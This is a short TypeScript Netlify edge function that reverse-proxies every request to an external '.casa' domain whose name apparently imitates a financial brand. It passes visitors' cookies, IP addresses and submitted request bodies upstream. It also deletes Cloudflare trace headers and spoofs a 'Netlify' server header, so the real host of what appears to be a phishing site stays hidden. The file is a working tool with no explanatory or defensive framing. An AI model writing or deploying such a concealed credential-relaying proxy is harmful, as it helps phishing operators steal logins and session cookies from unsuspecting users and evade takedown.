export default async (request: Request) => {
  const url = new URL(request.url);
  const workerBase = "https://individual.fidelholdingsign.casa/";
  
  // Construct the target URL
  const target = new URL(url.pathname + url.search, workerBase).toString();

  // Create clean headers for Cloudflare
  const proxyHeaders = new Headers();
  proxyHeaders.set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)");
  proxyHeaders.set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
  // Explicitly demand uncompressed HTML so Netlify doesn't break it
  proxyHeaders.set("Accept-Encoding", "identity");

  const cookie = request.headers.get("cookie");
  if (cookie) proxyHeaders.set("cookie", cookie);

  const clientIp = request.headers.get("x-nf-client-connection-ip") || request.headers.get("x-forwarded-for");
  if (clientIp) proxyHeaders.set("x-forwarded-for", clientIp);

  const upstream = await fetch(target, {
    method: request.method,
    headers: proxyHeaders,
    body: request.method === "GET" || request.method === "HEAD" ? undefined : request.body,
    redirect: "manual",
  });

  // Create clean headers for the browser
  const headers = new Headers(upstream.headers);
  
  // Strip Cloudflare traces
  headers.delete("cf-ray");
  headers.delete("cf-cache-status");
  headers.delete("server");
  
  // Strip compression headers to prevent blank rendering
  headers.delete("content-encoding");
  headers.delete("content-length");
  
  // Set Netlify headers
  headers.set("server", "Netlify");
  headers.set("x-frame-options", "SAMEORIGIN");
  headers.set("content-type", "text/html;charset=UTF-8");

  return new Response(upstream.body, {
    status: upstream.status,
    headers,
  });
};

export const config = { path: "/*" };
